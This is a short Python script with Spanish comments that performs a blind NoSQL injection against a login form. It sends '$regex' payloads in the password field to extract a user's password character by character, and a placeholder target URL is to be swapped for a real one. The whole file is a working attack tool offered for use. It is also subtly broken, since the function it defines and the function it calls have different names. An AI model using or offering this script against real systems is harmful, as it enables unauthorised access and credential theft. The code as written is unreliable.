#!/usr/bin/python3 

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
  print("\n\n[+] Saliendo ...\n")
  sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
login_url = "https://example.com" # Cambiar por la url de objetivo
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makerNoSQLI():

    password = ""

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(0, 24): # Campiar por la longitud de la contraseña
        for character in characters:

            post_data = '{"username":"toto","password":{"$regex":"^%s%s"}}' % (password,character)
            headers = {'Content-Type': 'application/json'}

            p1.status(post_data)

            r = requests.post(login_url, headers=headers, data=post_data)

            if "example" in r.text: # Cambiar por valor de respuesta correcta
                password += character
                p2.status(password)
                break
                

if __name__ == '__main__':
    makeNoSQLI()
